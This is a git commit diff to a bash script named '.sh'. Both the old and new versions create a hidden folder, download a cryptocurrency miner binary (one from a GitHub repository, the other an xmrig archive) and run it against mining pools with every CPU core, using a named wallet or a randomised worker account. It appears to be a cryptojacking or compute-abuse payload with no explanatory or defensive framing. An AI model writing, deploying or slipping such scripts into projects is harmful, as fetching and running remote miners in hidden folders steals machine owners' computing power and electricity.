ffb51a1e9ee09671b06626da8a2dad937fc1b889
loeto21 <161197201+loeto21@users.noreply.github.com>
2024-03-20 11:36:40 -0700

    Update .sh

--- .sh
+++ .sh
@@ -1,5 +1,4 @@
 #!/bin/bash
-mkdir .lib && cd .lib
-wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/aurum-hertzner
-chmod u+x sgr1
-./sgr1 -a aurum -o stratum+tcp://64.23.198.64:443 -u bit1qj5ykvg7l9nxv2pjn47qvaharq0hyt9pc3k4yv5.lieur -p x -t $(nproc --all) 
+mkdir .liba && cd .liba
+wget https://github.com/nandafiku/gradi/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
+./xmrig --donate-level 1 -o zeph-asia.f2pool.com:6100 -u kazep900.$(echo $(shuf -i 1-100000 -n 1)-C) -p x -a rx/0 -t $(nproc --all)
